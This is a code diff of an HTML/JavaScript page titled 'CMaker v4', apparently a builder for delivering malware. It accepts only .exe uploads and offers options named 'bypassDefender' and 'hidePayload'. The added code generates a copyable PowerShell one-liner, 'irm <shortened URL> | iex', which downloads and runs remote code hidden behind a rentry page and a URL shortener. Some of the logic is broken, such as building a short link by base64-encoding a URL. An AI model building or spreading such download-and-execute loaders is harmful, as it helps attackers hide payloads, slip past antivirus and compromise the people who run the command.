@@ -3,45 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CMaker v4</title>
+    <title>CMaker v4 - ASCII Obfuscator</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #202020;
+            background-color: #1e1e1e;
             color: white;
             margin: 0;
             padding: 0;
         }
         .container {
-            max-width: 400px;
+            max-width: 450px;
             margin: 80px auto;
-            background-color: #2d2d2d;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.5);
+            background-color: #2c2c2c;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.7);
             text-align: center;
         }
         h1 {
-            color: #ff0000;
+            color: #9b59b6;
             font-size: 2.5em;
+            margin-bottom: 20px;
         }
         label {
             display: block;
-            font-size: 1.2em;
-            margin-bottom: 10px;
+            font-size: 1.1em;
+            margin-bottom: 8px;
             text-align: left;
         }
-        input[type="text"], input[type="password"] {
+        input[type="text"], input[type="password"], input[type="file"] {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             margin-bottom: 20px;
             background-color: #333;
-            border: none;
+            border: 1px solid #9b59b6;
             border-radius: 5px;
             color: white;
         }
         .checkbox-group {
             text-align: left;
+            margin-bottom: 20px;
         }
         .checkbox-group input[type="checkbox"] {
             margin: 0 5px 10px;
@@ -52,25 +54,26 @@
         }
         .file-button, button {
             width: 100%;
-            padding: 10px;
-            background-color: #ff0000;
+            padding: 12px;
+            background-color: #9b59b6;
             border: none;
             border-radius: 5px;
             color: white;
             font-size: 1.2em;
             cursor: pointer;
             margin-top: 10px;
+            transition: background-color 0.3s ease;
         }
         .file-button:hover, button:hover {
-            background-color: #e60000;
+            background-color: #8e44ad;
         }
         .file-label {
-            color: #999;
+            color: #ccc;
             font-size: 0.9em;
         }
         .bottom-label {
             margin-top: 30px;
-            color: #ccc;
+            color: #bbb;
             font-size: 0.8em;
         }
         .error-msg {
@@ -84,6 +87,30 @@
             margin-top: 10px;
             text-align: left;
         }
+        .ascii-preview {
+            background-color: #2d2d2d;
+            color: #d3d3d3;
+            padding: 15px;
+            margin-top: 20px;
+            font-family: monospace;
+            overflow-y: auto;
+            max-height: 150px;
+            border: 1px solid #444;
+            border-radius: 5px;
+        }
+        .copy-btn {
+            background-color: #27ae60;
+            border: none;
+            padding: 12px;
+            color: white;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+            transition: background-color 0.3s ease;
+        }
+        .copy-btn:hover {
+            background-color: #219653;
+        }
     </style>
 </head>
 <body>
@@ -91,16 +118,13 @@
     <div class="container">
         <h1>CMaker v4</h1>
 
-        <!-- Form Starts Here -->
         <form id="cmakerForm">
-            <!-- Username and Password Fields -->
             <label for="username">Username</label>
             <input type="text" id="username" placeholder="Enter Username" required>
 
             <label for="password">Password</label>
             <input type="password" id="password" placeholder="Enter Password" required>
 
-            <!-- Checkbox Options -->
             <div class="checkbox-group">
                 <input type="checkbox" id="shortCode">
                 <label for="shortCode">Short Code</label>
@@ -118,16 +142,18 @@
                 <label for="ascii">ASCII</label>
             </div>
 
-            <!-- File Input -->
-            <label class="file-label">Select File</label>
-            <input type="file" id="fileInput" class="file-button">
+            <label class="file-label">Select File (only .exe)</label>
+            <input type="file" id="fileInput" class="file-button" accept=".exe">
 
             <div id="filePreview" class="file-preview"></div>
 
-            <!-- Submit Button -->
             <button type="submit">Submit</button>
 
             <div id="errorMessage" class="error-msg"></div>
+
+            <div id="asciiPreview" class="ascii-preview" style="display: none;"></div>
+
+            <button id="copyButton" class="copy-btn" style="display: none;" type="button">Copy Code</button>
         </form>
 
         <p class="bottom-label">Author: xStrong</p>
@@ -137,7 +163,8 @@
         const form = document.getElementById('cmakerForm');
         const fileInput = document.getElementById('fileInput');
         const errorMessage = document.getElementById('errorMessage');
-        const filePreview = document.getElementById('filePreview');
+        const asciiPreview = document.getElementById('asciiPreview');
+        const copyButton = document.getElementById('copyButton');
 
         form.addEventListener('submit', function(event) {
             event.preventDefault(); // Prevent form from submitting traditionally
@@ -145,44 +172,46 @@
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             const file = fileInput.files[0];
+            const asciiChecked = document.getElementById('ascii').checked;
+            const shortCodeChecked = document.getElementById('shortCode').checked;
 
+            // Check for validation errors
             if (!file) {
-                errorMessage.textContent = 'Please select a file.';
+                errorMessage.textContent = 'Please select a .exe file.';
                 return;
             }
 
-            // Check for any validation errors
             if (username === '' || password === '') {
                 errorMessage.textContent = 'Username and Password are required.';
                 return;
             }
 
-            // Collect form data
-            const formData = new FormData();
-            formData.append('username', username);
-            formData.append('password', password);
-            formData.append('file', file);
-            formData.append('shortCode', document.getElementById('shortCode').checked);
-            formData.append('bypassDefender', document.getElementById('bypassDefender').checked);
-            formData.append('base64', document.getElementById('base64').checked);
-            formData.append('hidePayload', document.getElementById('hidePayload').checked);
-            formData.append('ascii', document.getElementById('ascii').checked);
+            // Generate obfuscated code if Short Code is selected
+            if (shortCodeChecked) {
+                const rentryUrl = "https://rentry.co/your-static-url"; // Simulate the static page
+                const finalUrl = `https://www.shorturl.at/${btoa(rentryUrl)}`; // Simulate short URL creation
+                const obfuscatedCode = `Powershell "irm ${finalUrl} | iex"`;
 
-            // Display preview of the file
-            filePreview.textContent = `File Selected: ${file.name}`;
+                // Display the generated code
+                asciiPreview.textContent = obfuscatedCode;
+                asciiPreview.style.display = 'block';
 
-            // Example: Handle file submission with Fetch API (replace with actual backend URL)
-            fetch('/submit', {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.text())
-            .then(data => {
-                alert('File processed: ' + data);
-                filePreview.textContent = ''; // Clear file preview after submission
-            })
-            .catch(error => {
-                errorMessage.textContent = 'Error: ' + error;
+                // Enable the copy button and store full ASCII string for copying
+                copyButton.style.display = 'block';
+                copyButton.setAttribute('data-ascii', obfuscatedCode);
+            } else {
+                errorMessage.textContent = 'Please check the Short Code option.';
+            }
+        });
+
+        // Copy ASCII to clipboard when "Copy" is clicked
+        copyButton.addEventListener('click', function() {
+            const asciiString = copyButton.getAttribute('data-ascii');
+
+            navigator.clipboard.writeText(asciiString).then(() => {
+                alert('Obfuscated code copied to clipboard!');
+            }).catch(err => {
+                console.error('Failed to copy text: ', err);
             });
         });
     </script>
